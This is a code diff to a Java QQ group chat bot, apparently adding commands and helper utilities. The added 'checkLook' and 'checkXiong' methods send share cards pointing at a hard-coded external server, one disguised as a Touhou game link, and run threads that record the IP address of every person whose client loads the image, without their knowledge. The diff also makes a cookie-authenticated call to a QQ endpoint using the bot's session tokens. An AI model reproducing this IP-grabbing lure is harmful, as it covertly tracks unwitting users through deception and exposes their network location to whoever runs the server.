@@ -175,6 +175,13 @@ public class Methods {
             return false;
         }
         if (Autoreply.instence.CC.getAt(msg) == Autoreply.CQ.getLoginQQ()) {
+            if (msg.startsWith("精神支柱[CQ:at")) {
+                new JingShenZhiZhuQQManager(fromGroup, fromQQ, Autoreply.instence.CC.at(fromQQ));
+                return true;
+            } else if (msg.startsWith("神触[CQ:at")) {
+                new ShenChuQQManager(fromGroup, fromQQ, Autoreply.instence.CC.at(fromQQ));
+                return true;
+            }
             // 过滤特定的文字
             // @消息发送者并复读内容
             if (msg.contains("蓝") || msg.contains("藍") || msg.contains("赠送")) {
@@ -226,6 +233,57 @@ public class Methods {
 
         }
         return s;
+    }
+
+    // 窥屏检测
+    public static boolean checkLook(long fromGroup, String msg) {
+        if (msg.equals("有人吗") || msg.equalsIgnoreCase("testip") || msg.equalsIgnoreCase("窥屏检测")) {
+            int port = Autoreply.instence.random.nextInt(5000);
+            Autoreply.sendMessage(fromGroup, 0, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "窥屏检测", "滴滴滴", "http://123.207.65.93:" + (port + 4000) + "/111.jpg"));
+            final IPGetter ipGetter = new IPGetter(fromGroup, port);
+            Autoreply.instence.threadPool.execute(ipGetter);
+            Timer timer = new Timer();
+            timer.schedule(new TimerTask() {
+					@Override
+					public void run() {
+						Autoreply.sendMessage(ipGetter.fromGroup, 0, "当前有" + ipGetter.hSet.size() + "个小伙伴看了群聊");
+						ipGetter.running = false;
+					}
+				}, 20000);
+            return true;
+        }
+        return false;
+    }
+
+    public static boolean checkXiong(long fromQQ, String msg) {
+        if (Autoreply.instence.configManager.isAdmin(fromQQ)) {
+            if (msg.equals("吊熊")) {
+                int port = Autoreply.instence.random.nextInt(5000);
+                Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "东方绀珠传LNN", "东方绀珠传LNN", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
+                final XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
+                Autoreply.instence.threadPool.execute(ipGetter);
+                Timer timer = new Timer();
+                timer.schedule(new TimerTask() {
+						@Override
+						public void run() {
+							ipGetter.running = false;
+						}
+					}, 200000);
+                return true;
+            }
+            if (msg.equals("吊熊2")) {
+                int port = Autoreply.instence.random.nextInt(5000);
+                Autoreply.sendMessage(0, fromQQ, Autoreply.instence.CC.share("http://123.207.65.93:" + (port + 4000), "东方绀珠传LNN", "东方绀珠传LNN", "http://123.207.65.93:" + (port + 4000) + "/1111.jpg"));
+                XiongIPGetter ipGetter = new XiongIPGetter(fromQQ, port);
+                Autoreply.instence.threadPool.execute(ipGetter);
+                return true;
+            }
+        }
+        return false;
+    }
+
+    public static void setRandomPop() {
+        Methods.getSourceCode("http://logic.content.qq.com/bubble/setup?callback=&id=" + new Random().nextInt(269) + "&g_tk=" + Autoreply.CQ.getCsrfToken(), Autoreply.CQ.getCookies());
     }
 
     public static Map<String, String> cookieToMap(String value) {
@@ -315,6 +373,44 @@ public class Methods {
         return hashSet;
     }
 
+	public static byte[] mergeArray(byte[]... arrays) {
+		int allLen=0;
+		for (byte[] bs:arrays) {
+			allLen += bs.length;
+		}
+		byte[] finalArray=new byte[allLen];
+		int flag=0;
+		for (byte[] byteArray:arrays) {
+			for (int i=0;i < byteArray.length;++flag,++i) {
+				finalArray[flag] = byteArray[i];
+			}
+		}
+		return finalArray;
+	}
+
+	public static String[] mergeArray(String[]... arrays) {
+		int allLen=0;
+		for (String[] bs:arrays) {
+			allLen += bs.length;
+		}
+		String[] finalArray=new String[allLen];
+		int flag=0;
+		for (String[] byteArray:arrays) {
+			for (int i=0;i < byteArray.length;++flag,++i) {
+				finalArray[flag] = byteArray[i];
+			}
+		}
+		return finalArray;
+	}
+	
+	public static byte[] decryptBASE64(String key) throws Exception {
+		return (new BASE64Decoder()).decodeBuffer(key);
+	}
+
+	public static String encryptBASE64(byte[] key) throws Exception {
+		return (new BASE64Encoder()).encodeBuffer(key);
+	}
+	
 	public static String stringToMD5(String str) {
 
 		try {
@@ -370,21 +466,6 @@ public class Methods {
 			str[i * 2 + 1] = hexDigits[byte0 & 0xf];
 		}
 		return new String(str);
-	}
-
-	public static byte[] mergeArray(byte[]... arrays) {
-		int allLen=0;
-		for (byte[] bs:arrays) {
-			allLen += bs.length;
-		}
-		byte[] finalArray=new byte[allLen];
-		int flag=0;
-		for (byte[] byteArray:arrays) {
-			for (int i=0;i < byteArray.length;++flag,++i) {
-				finalArray[flag] = byteArray[i];
-			}
-		}
-		return finalArray;
 	}
 
 	/*  public static String getG_tk(String skey) {
